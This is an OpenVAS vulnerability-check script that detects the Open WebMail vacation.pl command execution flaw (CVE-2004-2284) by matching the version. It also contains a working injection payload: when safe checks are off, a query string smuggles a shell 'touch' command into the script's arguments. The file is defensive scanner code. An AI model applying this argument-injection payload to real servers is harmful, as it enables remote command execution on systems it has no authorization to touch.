###############################################################################
# OpenVAS Vulnerability Test
# $Id: openwebmail_vacation_input_validation.nasl 14121 2019-03-13 06:21:23Z ckuersteiner $
#
# Open WebMail vacation.pl Arbitrary Command Execution
#
# Authors:
# George A. Theall, <theall@tifaware.com>
#
# Copyright:
# Copyright (C) 2004 George A. Theall
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2,
# as published by the Free Software Foundation
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:openwebmail.acatysmoof:openwebmail";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.12637");
  script_version("$Revision: 14121 $");
  script_tag(name:"last_modification", value:"$Date: 2019-03-13 07:21:23 +0100 (Wed, 13 Mar 2019) $");
  script_tag(name:"creation_date", value:"2005-11-03 14:08:04 +0100 (Thu, 03 Nov 2005)");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_cve_id("CVE-2004-2284");
  script_bugtraq_id(10637);

  script_name("Open WebMail vacation.pl Arbitrary Command Execution");

  script_category(ACT_MIXED_ATTACK);
  script_copyright("This script is Copyright (C) 2004 George A. Theall");
  script_family("Gain a shell remotely");
  script_dependencies("openwebmail_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("OpenWebMail/detected");

  script_xref(name:"URL", value:"http://www.openwebmail.org/openwebmail/download/cert/advisories/SA-04:04.txt");

  script_tag(name:"impact", value:"This failure enables remote attackers to execute arbitrary programs on
  a target using the privileges under which the web server operates.");

  script_tag(name:"insight", value:"If safe_checks are disabled, the scanner attempts to create the file
  /tmp/<prefix>_openwebmail_vacation_input_validation on the target.");

  script_tag(name:"solution", value:"Upgrade to Open WebMail version 2.32 20040629 or later.");

  script_tag(name:"summary", value:"The target is running at least one instance of Open WebMail in which
  the vacation.pl component fails to sufficiently validate user input.");

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_banner");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");
include("host_details.inc");
include("misc_func.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:TRUE ) ) exit( 0 );
vers = infos['version'];
dir  = infos['location'];
if( dir == "/" ) dir = "";

# nb: intermediate releases of 2.32 from 20040527 - 20040628 are vulnerable, as are 2.32 and earlier releases.
pat = "^(1\.|2\.([0-2]|3[01]|32$|32 20040(5|6[01]|62[0-8])))";
if( ereg( pattern:pat, string:vers ) ) {

  # At this point, we know the target is running a potentially vulnerable
  # version. Still, we need to verify that vacation.pl is accessible since
  # one workaround is to simply remove the script from the CGI directory.

  url = dir + "/vacation.pl";

  # If safe_checks is disabled, I'll try to create
  # /tmp/xxx_openwebmail_vacation_input_validation as a PoC
  # although AFAIK there's no programmatic way to verify this worked
  # since the script doesn't display results of any commands that might be run.

  if( ! safe_checks() ) {
    vtstrings = get_vt_strings();
    url += "?-i+-p/tmp+-ftouch%20/tmp/" + vtstrings["lowercase"] + "_openwebmail_vacation_input_validation|";
  }

  req = http_get( item:url, port:port );
  res = http_keepalive_send_recv( port:port, data:req, bodyonly:FALSE );
  if( res && egrep( string:res, pattern:"^HTTP/1\.[01] 200" ) ) {
    report = report_vuln_url( port:port, url:url );
    security_message( port:port, data:report );
    exit( 0 );
  }
}

exit( 99 );
